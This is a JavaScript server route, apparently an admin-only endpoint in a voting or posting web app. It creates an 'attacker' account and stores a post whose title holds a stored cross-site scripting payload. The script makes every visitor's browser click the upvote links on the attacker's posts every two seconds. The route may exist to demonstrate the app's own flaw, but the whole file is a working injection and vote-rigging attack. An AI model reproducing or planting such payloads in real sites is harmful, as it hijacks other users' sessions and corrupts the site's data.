import { authGuard } from "$lib/admin/auth"
import * as db from "$lib/_db"
import { createUser } from "$lib/_db/users"
import { randomString } from "$lib/util"
import { createPostRecord } from "$lib/api/posts.util"

const attackScript = (attackerName) => `
<script>
  setInterval(() => {
    [...document.querySelectorAll('a')]
      .filter(a => a.textContent === '@${attackerName}')
      .map(a => a.closest('.card')?.querySelector('a.positive:not(.active)'))
      .filter(Boolean)
      .forEach(a => a.click())
  }, 2000)
</script>
`

export async function post({ request }) {
  return authGuard(request, async () => {
    const { attacker, post } = await request.json()

    const password = randomString()

    try {
      await createUser({ name: attacker, password })
    } catch (err) {
      if (err?.response?.status === 409) {
        // that's ok, already exists
      } else {
        console.error("Failed to create attacker user", err)
        return {
          status: 500,
          body: `Failed to create attacker user (${attacker})`,
        }
      }
    }

    const { current_era: eraPeriod } = await db.get("$settings")

    const record = createPostRecord(
      { eraPeriod },
      {
        ...post,
        author: attacker,
        title: attackScript(attacker),
      }
    )

    try {
      await db.put(record)
    } catch (err) {
      return {
        status: 500,
        body: `Failed to post XSS post: ${err}`,
      }
    }

    return { body: record }
  })
}
